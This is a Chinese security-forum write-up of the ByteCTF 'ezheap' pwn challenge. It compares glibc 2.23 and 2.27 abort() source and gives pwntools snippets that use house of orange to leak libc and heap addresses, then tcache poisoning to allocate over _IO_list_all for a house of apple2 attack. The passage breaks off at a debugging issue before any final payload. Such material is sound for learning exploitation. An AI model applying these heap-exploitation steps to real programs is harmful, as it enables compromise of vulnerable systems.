---
title: libc2.27下的house of orange+house of apple2
url: https://forum.butian.net/share/3888
source: 奇安信攻防社区
date: 2024-11-21
fetch_date: 2025-10-06T19:12:09.902924
---

# libc2.27下的house of orange+house of apple2

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [漏洞分析与复现](https://forum.butian.net/articles)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### libc2.27下的house of orange+house of apple2

本文详细地分析了ByteCTF大师赛ezheap这道题，同时在这个题的基础上进行了libc2.27下的house of orange+house of apple2攻击的尝试并成功getshell

前言
==
malloc\\_assert在libc2.23与libc2.27的不同
-----------------------------------
glibc source <https://elixir.bootlin.com/glibc/>
```C
static void
\_\_malloc\_assert (const char \*assertion, const char \*file, unsigned int line,
const char \*function)
{
(void) \_\_fxprintf (NULL, "%s%s%s:%u: %s%sAssertion `%s' failed.\n",
\_\_progname, \_\_progname[0] ? ": " : "",
file, line,
function ? function : "", function ? ": " : "",
assertion);
fflush (stderr);
abort ();
}
```
主要是abort的不同
- libc2.23,可以看到abort函数中还有处理IO相关的函数，因此常见的house of orange都是在glibc2.23的情况下使用
```c
void
abort (void)
{
struct sigaction act;
sigset\_t sigs;
/\* First acquire the lock. \*/
\_\_libc\_lock\_lock\_recursive (lock);
/\* Now it's for sure we are alone. But recursive calls are possible. \*/
/\* Unlock SIGABRT. \*/
if (stage == 0)
{
++stage;
if (\_\_sigemptyset (&sigs) == 0 &&
\_\_sigaddset (&sigs, SIGABRT) == 0)
\_\_sigprocmask (SIG\_UNBLOCK, &sigs, (sigset\_t \*) NULL);
}
/\* Flush all streams. We cannot close them now because the user
might have registered a handler for SIGABRT. \*/
if (stage == 1)
{
++stage;
fflush (NULL);
}
/\* Send signal which possibly calls a user handler. \*/
if (stage == 2)
{
/\* This stage is special: we must allow repeated calls of
`abort' when a user defined handler for SIGABRT is installed.
This is risky since the `raise' implementation might also
fail but I don't see another possibility. \*/
int save\_stage = stage;
stage = 0;
\_\_libc\_lock\_unlock\_recursive (lock);
raise (SIGABRT);
\_\_libc\_lock\_lock\_recursive (lock);
stage = save\_stage + 1;
}
/\* There was a handler installed. Now remove it. \*/
if (stage == 3)
{
++stage;
memset (&act, '\0', sizeof (struct sigaction));
act.sa\_handler = SIG\_DFL;
\_\_sigfillset (&act.sa\_mask);
act.sa\_flags = 0;
\_\_sigaction (SIGABRT, &act, NULL);
}
/\* Now close the streams which also flushes the output the user
defined handler might has produced. \*/
if (stage == 4)
{
++stage;
\_\_fcloseall ();
}
/\* Try again. \*/
if (stage == 5)
{
++stage;
raise (SIGABRT);
}
/\* Now try to abort using the system specific command. \*/
if (stage == 6)
{
++stage;
ABORT\_INSTRUCTION;
}
/\* If we can't signal ourselves and the abort instruction failed, exit. \*/
if (stage == 7)
{
++stage;
\_exit (127);
}
/\* If even this fails try to use the provided instruction to crash
or otherwise make sure we never return. \*/
while (1)
/\* Try for ever and ever. \*/
ABORT\_INSTRUCTION;
}
```
- libc2.27,可以发现处理IO相关的函数被移除了
```c
void
abort (void)
{
struct sigaction act;
sigset\_t sigs;
/\* First acquire the lock. \*/
\_\_libc\_lock\_lock\_recursive (lock);
/\* Now it's for sure we are alone. But recursive calls are possible. \*/
/\* Unblock SIGABRT. \*/
if (stage == 0)
{
++stage;
\_\_sigemptyset (&sigs);
\_\_sigaddset (&sigs, SIGABRT);
\_\_sigprocmask (SIG\_UNBLOCK, &sigs, 0);
}
/\* Send signal which possibly calls a user handler. \*/
if (stage == 1)
{
/\* This stage is special: we must allow repeated calls of
`abort' when a user defined handler for SIGABRT is installed.
This is risky since the `raise' implementation might also
fail but I don't see another possibility. \*/
int save\_stage = stage;
stage = 0;
\_\_libc\_lock\_unlock\_recursive (lock);
raise (SIGABRT);
\_\_libc\_lock\_lock\_recursive (lock);
stage = save\_stage + 1;
}
/\* There was a handler installed. Now remove it. \*/
if (stage == 2)
{
++stage;
memset (&act, '\0', sizeof (struct sigaction));
act.sa\_handler = SIG\_DFL;
\_\_sigfillset (&act.sa\_mask);
act.sa\_flags = 0;
\_\_sigaction (SIGABRT, &act, NULL);
}
/\* Try again. \*/
if (stage == 3)
{
++stage;
raise (SIGABRT);
}
/\* Now try to abort using the system specific command. \*/
if (stage == 4)
{
++stage;
ABORT\_INSTRUCTION;
}
/\* If we can't signal ourselves and the abort instruction failed, exit. \*/
if (stage == 5)
{
++stage;
\_exit (127);
}
/\* If even this fails try to use the provided instruction to crash
or otherwise make sure we never return. \*/
while (1)
/\* Try for ever and ever. \*/
ABORT\_INSTRUCTION;
}
```
进一步思考
-----
常规的hosue of orange是难以实现像tcache poison一样任意地址申请，\*\*而一般house of orange通过unsorted bin attack然后触发malloc\\_assert走IO也是根据malloc\\_assert中的abort中的IO处理函数进而遍历\\_IO\\_list\\_all进行IO攻击\*\*，既然abort中没有IO处理了，是否可以通过malloc\\_assert中的fflush (stderr);走IO呢?
思考过后是难以实现的，一般用house of orange都是没有任意地址申请的，所以难以控制stderr或者\\_IO\\_2\\_1\\_stderr，那就难以进行IO攻击
最后的思考
-----
那么应该如何进行攻击来getshell呢?这里就得用一种新的house of orange攻击，而这个攻击具体的手法我最早看到的文章是在看雪的一篇文章中看到的[house of orange+](https://bbs.kanxue.com/thread-282523.htm)
但是上面的手法还只是在libc2.23中使用，最后通过fastbin attack攻击。\*\*而在libc2.27中，引入了tcache，可以采用类似的方法直接进行tcache poison，最终实现任意地址申请，任意地址写任意值\*\*
有关调试
----
一个小技巧：有时候题目给的libc是没有符号表的，难以调试，可以从glibc-all-in-one中找到有符号表的同样版本的libc，这样有符号表，pwndbg更好有断点进行调试
题目分析
====
此题是ByteCTF大师赛 Pwn方向的ezheap这道题
保护全开
add函数，没有什么漏洞
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-ca131f595eabfa4199133fe76e0f8b2f435e9014.png)
delete函数
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-af7483ea6d81b9caf039a8ecd5fa1f6ffcdb4bda.png)
show函数
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-09af02a86966f986723d8f887f88b731dd2f7856.png)
edit函数，有很大的漏洞，可以自己输入想要edit的长度，checksanbox后面再做分析
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-6d2fda43f2235ce274837e5c59716811d98f10d4.png)
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-2f083b04d0b797484c4e2e173c83bcf417bc9384.png)
house of orange泄露libcbase与heapbase
----------------------------------
```python
add(0x8)
edit(0, 0x20, b"a" \* 0x18 + p64(0xD91))
add(0x1000)
add(0x400)
edit(0, 0x20, b"a" \* 0x18 + b"a" \* 8)
show(0)
p.recvuntil("a" \* 0x20)
libc.address = u64(p.recv(6).ljust(8, b"\x00")) - 0x3EBCA0 - 0x600
print(f"libc: {hex(libc.address)}")
edit(0, 0x30, b"a" \* 0x30)
show(0)
p.recvuntil("a" \* 0x30)
heap\_addr = u64(p.recv(6).ljust(8, b"\x00")) - 0x270
print(f"heap: {hex(heap\_addr)}")
```
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-7e546cf6c7da9a578fe7521680079c82e8183e7f.png)
利用house of orange+让top chunk进入tcache bin进而tcache poison
-------------------------------------------------------
```python
add(0x310)
add(0x5F0 + 0x30)
add(0xF60)
edit(5, 0xF70, b"a" \* 0xF60 + p64(0) + p64(0x81))
# dbg()
add(0x100)
edit(
5,
0xF78,
b"a" \* 0xF60 + p64(0) + p64(0x81) + p64(libc.sym['\_IO\_list\_all']),
)
add(0x58)
add(0x58)
```
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-f431c4cc5dada8ad09f5d97ac06a9924dfd8aa2d.png)
这里的0x555555580010刚好是扩展的top\\_chunk的位置，通过edit这个地方，那么就可以伪造一个新的top chunk的大小，让这个大小可以进入tcache
\*\*需要注意一点的是（这点我在上面提及的自己的文章中写过），这个地方扩展top chunk，那么进入unsorted bin或者tcache bin的top chunk大小会小0x20，所以这里是p64(0x81)后面是add(0x58)\*\*
libc2.27的house of apple2
------------------------
这里分析checksanbox，其实有了任意地址申请最开始是想打malloc\\_hook然后打one\\_gadget，但是发现要用realloc调整堆栈，但这个checksanbox正好就卡住了realloc\\_hook这里，所以就不能打了
这里直接任意地址申请\\_IO\\_list\\_all,然后覆盖为一个堆地址，最后用题目中的exit触发IO
但是实际操作的过程中遇到一个问题，用自己的板子，call \[rax+0x68\]时rax是空值
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-ac5a8d3d40a263b6b63af4760d3653dc66fdbda1.png)
...